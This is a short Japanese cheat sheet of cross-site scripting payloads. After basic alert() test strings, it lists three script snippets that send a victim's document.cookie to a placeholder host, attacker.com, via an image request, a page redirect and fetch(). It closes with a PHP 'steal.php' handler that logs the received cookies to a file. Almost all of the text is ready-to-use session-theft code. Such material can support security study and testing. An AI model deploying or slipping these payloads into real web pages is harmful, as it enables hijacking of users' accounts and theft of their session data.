- 基本構文
```xml
<script>alert(42)</script>
```

```xml
<script>alert('XSS');</script>
```
- 画像ファイル形式
```xml
<script>
new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
</script>
```
- パラメータを付けて送信
```xml
<script>
location.href='http://attacker.com/log?cookie='+document.cookie
</script>
```

```xml
<script>
fetch('http://attacker.com/log?cookie=' + encodeURIComponent(document.cookie));
</script>
```
- 攻撃者がCookieを受け取るサーバー側の処理（`steal.php`）は以下
```php
<?php 
file_put_contents('cookies.txt', $_GET['c'] . "\n", FILE_APPEND); 
?>
```
